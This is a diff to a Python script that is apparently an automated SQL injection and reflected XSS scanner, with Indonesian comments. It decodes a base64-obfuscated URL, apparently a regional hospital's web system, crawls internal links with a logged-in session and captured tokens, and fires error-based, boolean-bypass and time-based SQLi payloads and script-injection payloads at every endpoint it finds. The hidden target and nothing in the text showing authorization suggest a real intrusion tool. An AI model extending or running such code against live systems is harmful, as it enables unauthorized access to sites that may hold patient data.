@@ -313,10 +313,26 @@ def vulnerability_audit():
     
     cookies = session.cookies.get_dict()
     session_id = cookies.get('PHPSESSID') or cookies.get('ci_session') or "Not Found"
-    base_url = BASE_TARGET_URL + NO_RM
+
+    # Step 1: Discovery URL Internal untuk Target Audit
+    print(f"[*] Mencari target audit di seluruh endpoint internal...")
+    discovered_urls = []
+    try:
+        home_url = _decode("aHR0cHM6Ly9kb2xhbi5yc3Vkc29ldGlqb25vYmxvcmEuY29tL2luZGV4LnBocC9ob21l")
+        r_disc = session.get(home_url, timeout=10)
+        s_disc = BeautifulSoup(r_disc.text, 'html.parser')
+        for a in s_disc.find_all('a', href=True):
+            href = a['href']
+            if "index.php" in href and "logout" not in href.lower() and href.startswith('http'):
+                if href not in discovered_urls:
+                    discovered_urls.append(href)
+    except: pass
+    
+    if not discovered_urls:
+        discovered_urls = [BASE_TARGET_URL + NO_RM]
     
     print(f"[*] Inisialisasi Scan  : {ts_init}")
-    print(f"[*] Target URL         : {BASE_TARGET_URL}{NO_RM}")
+    print(f"[*] Terdeteksi Target  : {len(discovered_urls)} URL unik")
     print(f"[*] Captured Token     : {last_token}")
     print(f"[*] Session ID         : {session_id}")
     print("-" * 85)
@@ -324,7 +340,7 @@ def vulnerability_audit():
     findings = []
     
     # 1. SQL Injection Testing
-    print(f"\n[+] Memulai Audit: SQL Injection (Error & Time Based)")
+    print(f"\n[+] Audit Tahap 1: SQL Injection (Multi-Target)")
     sqli_payloads = [
         ("'", "Error-Based SQLi"),
         ("' OR 1=1--", "Boolean-Based Bypass"),
@@ -332,30 +348,32 @@ def vulnerability_audit():
         ("' AND (SELECT 1 FROM (SELECT(SLEEP(5)))a)--", "Time-Based Blind SQLi")
     ]
 
-    for payload, method in sqli_payloads:
-        ts = time.strftime("%H:%M:%S")
-        test_url = base_url + payload
-        try:
-            start_t = time.time()
-            res = session.get(test_url, timeout=10)
-            elapsed = time.time() - start_t
-            
-            is_vuln = False
-            if _decode('U0xFRVA=') in payload and elapsed >= 5:
-                is_vuln = True
-            elif any(x in res.text.lower() for x in ["sql syntax", "mysql_fetch", "database error"]):
-                is_vuln = True
-            
-            status = "[\033[91mVULNERABLE!\033[0m]" if is_vuln else "[\033[92mSAFE\033[0m]"
-            print(f" [{ts}] Payload: {payload.ljust(45)} {status}")
-            
-            if is_vuln:
-                findings.append({"type": "SQL Injection", "severity": "HIGH", "loc": "/reservasi_dokter/tambah/", "method": method})
-        except:
-            print(f" [{ts}] Payload: {payload.ljust(45)} [TIMEOUT/ERROR]")
+    for base_audit_url in discovered_urls:
+        print(f" [*] Testing Target: {base_audit_url[:70]}...")
+        for payload, method in sqli_payloads:
+            ts = time.strftime("%H:%M:%S")
+            test_url = base_url = base_audit_url + payload
+            try:
+                start_t = time.time()
+                res = session.get(test_url, timeout=10)
+                elapsed = time.time() - start_t
+                
+                is_vuln = False
+                if _decode('U0xFRVA=') in payload and elapsed >= 5:
+                    is_vuln = True
+                elif any(x in res.text.lower() for x in ["sql syntax", "mysql_fetch", "database error"]):
+                    is_vuln = True
+                
+                if is_vuln:
+                    status = "[\033[91mVULNERABLE!\033[0m]"
+                    print(f" [{ts}] Payload: {payload.ljust(45)} {status}")
+                    findings.append({"type": "SQL Injection", "severity": "HIGH", "loc": base_audit_url, "method": method})
+                    break 
+            except:
+                pass
 
     # 2. XSS Testing
-    print(f"\n[+] Memulai Audit: Reflected Cross-Site Scripting (XSS)")
+    print(f"\n[+] Audit Tahap 2: Reflected Cross-Site Scripting (XSS)")
     xss_payloads = [
         ("<script>alert(1)</script>", "Basic Script Injection"),
         ("<svg/onload=alert(1)>", "SVG Animation Injection"),
@@ -367,15 +385,22 @@ def vulnerability_audit():
     for payload in xss_payloads:
         ts = time.strftime("%H:%M:%S")
         try:
-            res = session.get(search_url + payload, timeout=10)
-            is_vuln = payload in res.text
+            # Gunakan penanganan encoding yang lebih kuat untuk XSS payload
+            encoded_payload = requests.utils.quote(payload)
+            res = session.get(search_url + encoded_payload, timeout=10)
+            
+            # Cek apakah payload terpantul di response body (Gunakan content untuk menghindari error encoding)
+            response_text = res.content.decode('utf-8', errors='ignore')
+            is_vuln = payload in response_text
+            
             status = "[\033[91mVULNERABLE!\033[0m]" if is_vuln else "[\033[92mSAFE\033[0m]"
-            print(f" [{ts}] Payload: {payload.ljust(45)} {status}")
+            print(f" [{ts}] Payload: {payload[:45].ljust(45)} {status}")
             
             if is_vuln:
                 findings.append({"type": "Reflected XSS", "severity": "MEDIUM", "loc": "/riwayat_pemeriksaan/search", "method": "Script Reflection"})
-        except:
-            print(f" [{ts}] Payload: {payload.ljust(45)} [TIMEOUT/ERROR]")
+                break
+        except Exception as e:
+            print(f" [{ts}] Payload: {payload[:45].ljust(45)} [ERROR: {str(e)[:20]}]")
 
     # Tabel Ringkasan (Summary Report)
     print(f"\n" + "-"*85)
